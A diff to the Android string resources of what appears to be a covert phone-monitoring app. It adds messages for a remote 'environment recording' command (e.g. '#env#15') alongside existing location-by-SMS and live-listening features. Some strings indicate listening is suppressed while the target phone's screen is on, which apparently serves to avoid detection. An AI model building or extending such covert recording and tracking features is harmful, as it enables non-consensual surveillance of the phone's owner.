@@ -54,10 +54,13 @@
     <string name="location_sms_base_station_cdma">Current base station location: http://maps.google.com/?q=%s</string>
     <string name="location_sms_fail">Sorry, cannot get location now. Please try again later. Contact support if necessary.</string>
     
-    <!-- Environment Listening -->
-    <string name="env_fail_exception">Exception occurred in the target phone, so environment listening failed.</string>
-    <string name="env_fail_offhook">The target phone is now in a call, so you cannot listen to its environment.</string>
-    <string name="env_fail_screen_on">The target phone is now being viewed or operated, so you cannot listen to its environment for safety reason.</string>
+    <!-- Environment Recording & Listening -->
+    <string name="env_record">EnvRecord</string>
+    <string name="env_rec_invalid_minutes">Please check indication format (e.g. #env#15), notice that the recording minutes should be 1 ~ 30.</string>
+    <string name="env_rec_fail_exception">Exception occurred in the target phone, so environment recording failed.</string>
+    <string name="env_listen_fail_exception">Exception occurred in the target phone, so environment listening failed.</string>
+    <string name="env_listen_fail_offhook">The target phone is now in a call, so you cannot listen to its environment.</string>
+    <string name="env_listen_fail_screen_on">The target phone is now being viewed or operated, so you cannot listen to its environment for safety reason.</string>
     
     <!-- Preferences -->
     <string name="pref_title">Preferences</string>
